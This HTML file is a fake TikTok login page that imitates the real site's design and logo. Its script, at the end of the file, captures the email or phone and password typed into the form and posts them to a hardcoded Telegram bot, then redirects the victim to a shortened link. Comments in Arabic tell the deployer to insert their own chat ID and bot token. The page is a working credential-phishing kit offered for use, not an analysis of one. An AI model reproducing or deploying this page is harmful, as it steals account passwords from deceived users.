<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok Login with Telegram</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #000;
            color: #fff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            background-color: #1c1c1e;
            padding: 20px;
            width: 100%;
            max-width: 400px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            text-align: center;
        }

        .logo {
            margin-bottom: 20px;
        }

        .logo img {
            width: 100px;
            height: auto;
        }

        .login-box input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: none;
            border-radius: 4px;
            background-color: #333;
            color: #fff;
            box-sizing: border-box;
        }

        .login-box .btn-login {
            width: 100%;
            padding: 12px;
            background-color: #fe2c55;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }

        .login-box .btn-login:hover {
            background-color: #e6254f;
        }

        .login-box .divider {
            margin: 20px 0;
            position: relative;
            text-align: center;
        }

        .login-box .divider:before,
        .login-box .divider:after {
            content: '';
            position: absolute;
            top: 50%;
            width: 40%;
            height: 1px;
            background-color: #555;
        }

        .login-box .divider:before {
            left: 0;
        }

        .login-box .divider:after {
            right: 0;
        }

        .login-box .divider span {
            background-color: #1c1c1e;
            padding: 0 10px;
            color: #8e8e8e;
        }

        .login-box .other-login {
            display: flex;
            justify-content: space-around;
            margin-top: 20px;
        }

        .login-box .other-login a {
            color: #007bff;
            text-decoration: none;
        }

        .login-box .signup-box {
            margin-top: 20px;
            font-size: 0.9em;
        }

        .login-box .signup-box a {
            color: #fe2c55;
            font-weight: bold;
            text-decoration: none;
        }

        .login-box .signup-box a:hover {
            text-decoration: underline;
        }

        .download-app {
            text-align: center;
            margin-top: 20px;
        }

        .download-app img {
            width: 120px;
            margin: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://static.vecteezy.com/system/resources/thumbnails/018/930/573/small/tiktok-logo-tikok-icon-transparent-tikok-app-logo-free-png.png" alt="TikTok Logo">
        </div>
        <div class="login-box">
            <form id="loginForm">
                <input type="text" id="emailOrPhone" placeholder="Email or Phone" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit" class="btn-login">Log In</button>
                <div class="divider"><span>OR</span></div>
                <div class="other-login">
                    <a href="#">Log in with Google</a>
                    <a href="#">Log in with Facebook</a>
                </div>
                <div class="signup-box">
                    <p>Don't have an account? <a href="#">Sign up</a></p>
                </div>
            </form>
        </div>
    </div>

    <script>
        const form = document.getElementById('loginForm');
        const chatId = '614770779'; // ضع هنا معرف الدردشة الخاص بك
        const botToken = '7489145843:AAEPhf2hgpI75l5npkxxVmm1sKX-ctiRz9Q'; // ضع هنا رمز التوكن الخاص بالبوت

        form.addEventListener('submit', (e) => {
            e.preventDefault();
            const emailOrPhone = document.getElementById('emailOrPhone').value;
            const password = document.getElementById('password').value;
            const message = `TikTOK Email/Phone: ${emailOrPhone}\nPassword: ${password}`;

            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            const data = {
                chat_id: chatId,
                text: message
            };

            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            }).then(() => {
                window.location.href = 'https://smrturl.co/cedf363';
            });
        });
    </script>
</body>
</html>
